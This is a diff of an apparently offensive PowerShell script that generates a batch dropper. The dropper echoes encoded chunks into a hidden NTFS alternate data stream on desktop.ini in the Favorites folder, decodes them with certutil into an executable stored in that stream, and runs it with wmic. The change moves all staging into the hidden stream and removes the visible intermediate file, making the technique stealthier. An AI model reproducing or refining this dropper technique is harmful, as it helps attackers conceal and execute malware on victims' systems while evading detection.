@@ -27,15 +27,15 @@ for ($x = 0; $x -lt 16; $x++) {
 $oldPnt = $pnt
 $pnt = 0
 while ($pnt -le $oldPnt) {
-$result += "echo|set /p=%param$($pnt)%>>%userprofile%\$($random)2"
+$result += "echo|set /p=%param$($pnt)%>>%userprofile%\Favorites\desktop.ini:$($random)"
 $result += "`r`n"
 $pnt++;
 }
 
-$result += "certutil -decode %userprofile%\$($random)2 %userprofile%\$($random).exe"
+$result += "certutil -decode %userprofile%\Favorites\desktop.ini:$($random) %userprofile%\Favorites\desktop.ini:$($random).exe"
 $result += "`r`n"
-$result += "type %userprofile%\$($random).exe > %userprofile%\Favorites\desktop.ini:$($random).exe"
-$result += "`r`n"
+#$result += "type %userprofile%\$($random).exe > %userprofile%\Favorites\desktop.ini:$($random).exe"
+#$result += "`r`n"
 $result += "wmic process call create `"%userprofile%\Favorites\desktop.ini:$($random).exe`""
 Write-Host $result
 #$result | Out-File "$($random).bat"
